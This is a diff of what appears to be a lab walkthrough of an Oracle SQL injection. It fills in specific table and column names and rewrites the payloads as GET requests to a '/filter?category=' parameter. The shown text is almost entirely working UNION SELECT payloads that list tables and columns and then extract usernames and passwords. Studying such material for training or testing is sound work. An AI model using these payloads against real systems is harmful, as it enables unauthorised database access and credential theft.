@@ -13,7 +13,7 @@
 2. List columns:
 
 ```
-' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XXXXX'--
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JBZEMH'--
 ```
 
 Note: Oracle stores identifiers in UPPERCASE by default.
@@ -21,13 +21,13 @@ Note: Oracle stores identifiers in UPPERCASE by default.
 3. Retrieve data:
 
 ```
-' UNION SELECT USERNAME_XXXXX, PASSWORD_XXXXX FROM USERS_XXXXX--
+' UNION SELECT USERNAME_LDCZDH, PASSWORD_WXJANO FROM USERS_JBZEMH--
 ```
 
 ## Key Payloads
 
 ```
-' UNION SELECT table_name, NULL FROM all_tables--
-' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XXXXX'--
-' UNION SELECT USERNAME_XXXXX, PASSWORD_XXXXX FROM USERS_XXXXX--
+GET /filter?category=' UNION SELECT table_name, NULL FROM all_tables--
+GET /filter?category=' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JBZEMH'--
+GET /filter?category=' UNION SELECT USERNAME_LDCZDH, PASSWORD_WXJANO FROM USERS_JBZEMH--
 ```
